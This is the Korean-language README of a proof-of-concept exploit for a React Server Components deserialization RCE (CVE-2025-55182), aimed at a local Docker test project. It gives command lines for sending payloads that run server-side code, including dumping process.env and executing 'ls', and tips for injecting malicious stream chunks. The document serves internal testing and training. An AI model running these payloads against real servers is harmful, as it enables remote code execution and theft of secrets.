# CVE-2025-55182 (React2Shell) PoC

RSC 역직렬화 RCE를 재현하는 PoC 스크립트입니다. **내부 점검·교육 목적으로만 사용하세요.**

## 대상

- 본 프로젝트 **frontend-rsc** (Vite + @vitejs/plugin-rsc 0.5.2, React 19.2.0)
- **로컬에서 Docker로 띄웠을 때**: HTTP 요청은 **8888 포트**로 보내면 됩니다.
- 메인 앱 경유: `POST http://localhost:8888/api/rsc/render`
- RSC 서버 직접: `POST http://localhost:5174/api/rsc/render`

## 사용법

### Docker 안에서 실행 (Python 설치 없이)

`app`, `frontend-rsc`가 떠 있는 상태에서 프로젝트 루트에서:

```bash
docker compose --profile poc run --rm poc
```

- 같은 Docker 네트워크에서 **http://app:8080/api/rsc/render** 로 요청합니다.
- 다른 코드로 테스트:  
  `docker compose --profile poc run --rm poc -- --code "console.log(process.env)"`  
  (맨 앞의 `--` 뒤가 PoC 인자입니다.)

### Windows에서 Python이 안 될 때

- **`python`을 찾을 수 없다**고 나오면:
  1. **`py` 런처**로 시도 (Python 설치 시 함께 들어 있는 경우):  
     `py cve-2025-55182-poc.py`
  2. **Node.js로 실행** (Python 없이):  
     `node cve-2025-55182-poc.mjs`
  3. **Python 설치**: [python.org](https://www.python.org/downloads/) 에서 설치 시 **"Add Python to PATH"** 체크.  
     이미 설치했는데 `python`만 안 되면: **설정 → 앱 → 고급 앱 설정 → 앱 실행 별칭** 에서 `python.exe` / `python3.exe` **Microsoft Store 열기**를 끄면, PATH에 있는 실제 Python이 사용됩니다.

### Python 3 (표준 라이브러리만 사용)

```bash
# 기본: 무해한 console.log 실행 확인 (Windows: py 사용 가능)
python cve-2025-55182-poc.py
# 또는: py cve-2025-55182-poc.py

# URL 지정 (RSC 서버 직접 호출 시)
python cve-2025-55182-poc.py --url http://localhost:5174/api/rsc/render

# 서버에서 실행할 JS 코드 지정 (한 줄)
python cve-2025-55182-poc.py --code "console.log(1+1)"
python cve-2025-55182-poc.py --code "console.log(process.env.USER)"

# 페이로드만 확인 (전송 안 함)
python cve-2025-55182-poc.py --dry-run

# Next.js 형식 multipart/form-data 로 전송 (스트림 대신 decodeReply 경로 — Connection closed 시 시도)
python cve-2025-55182-poc.py --multipart

# RSC 서버에서 실제 스트림을 받아 그대로 POST (파이프라인 검증, 200이면 역직렬화 경로 정상)
python cve-2025-55182-poc.py --fetch-payload
python cve-2025-55182-poc.py --fetch-payload --fetch-url http://localhost:5174/?rsc --url http://localhost:8888/api/rsc/render

# RCE 예제: 실제 스트림 + ls 실행 페이로드 전송. 결과는 frontend-rsc 로그에서 확인.
python cve-2025-55182-poc.py --rce

# 이 프로젝트에서 RCE 결과까지 확인: 재생 API 사용 (스트림 내 _prefix 서버 실행)
python cve-2025-55182-poc.py --rce-inject --replay
# Docker 빌드 없이 확인 시: frontend-rsc 를 로컬에서 띄운 뒤 아래로 직접 호출
# python cve-2025-55182-poc.py --rce-inject --replay --url http://localhost:5174/api/rsc/replay

# 스트림 형식 분석 (RCE 주입 시 참고)
python cve-2025-55182-poc.py --analyze

# 스트림을 파일로 저장
python cve-2025-55182-poc.py --save-stream payload.bin
```

**RCE 확인 방법**
- **500 응답**이 오고, 응답 본문에 `ls` 결과(파일/폴더 목록)가 포함되어 있으면 → **RCE 성공**. PoC가 `[+] RCE 출력 (응답 본문에 실림):` 아래에 그대로 출력합니다.
- **200 응답**이면 → 이 스택(Vite 6 + plugin-rsc 0.5.2)에서는 **실제 스트림만 역직렬화**되고, 뒤에 붙인 RCE 페이로드는 처리되지 않습니다. 즉, **역직렬화 경로·파이프라인 검증**만 된 상태이며, **RCE는 이 환경에서는 재현되지 않습니다.** RCE를 확인하려면 **Next.js** 등 공개 PoC 대상 환경을 사용하거나, `--analyze` / `--save-stream` 으로 스트림을 분석한 뒤 악성 청크를 주입해 보세요. 자세한 절차는 `docs/CVE-2025-55182-React2Shell.md` 의 **「RCE까지 확인하려면」** 섹션을 참고하세요.
- 추가로 결과를 보고 싶으면 `docker compose logs frontend-rsc` 로 서버 로그를 확인할 수 있습니다.

### Node.js 18+

```bash
node cve-2025-55182-poc.mjs
node cve-2025-55182-poc.mjs --url http://localhost:8888/api/rsc/render --code "console.log(process.version)"
```

## 기대 결과

- **200 + `{"ok":true,"message":"deserialized"}`** → 역직렬화 성공. 실행한 코드는 **RSC 서버(frontend-rsc) 프로세스**의 stdout/로그에 남습니다.
- **500** → (1) **RSC 서버(frontend-rsc)에 연결 실패**: Docker 사용 시 `frontend-rsc` 컨테이너가 기동 중인지 확인하세요. `docker compose ps`, `docker compose logs frontend-rsc` 로 준비 여부 확인. (2) **RSC 서버가 역직렬화 오류 반환**: 페이로드/버전 불일치일 수 있음.
- **502 + `RSC server unreachable`** → app에서 frontend-rsc:5174 로 연결할 수 없음. `docker compose up -d` 로 frontend-rsc 포함 전체 기동 후, RSC 서버가 완전히 뜰 때까지 기다리세요.

## 참고

- 페이로드 형식: React Flight 스트림(row 기반). lachlan2k의 02-meow-rce-poc 스타일.
- Next.js 등 다른 RSC 구현은 `Next-Action` + multipart/form-data 를 쓰므로, 이 PoC는 **Vite RSC / 본 프로젝트 frontend-rsc** 대상입니다.
- 자세한 취약점 설명: [../docs/CVE-2025-55182-React2Shell.md](../docs/CVE-2025-55182-React2Shell.md)
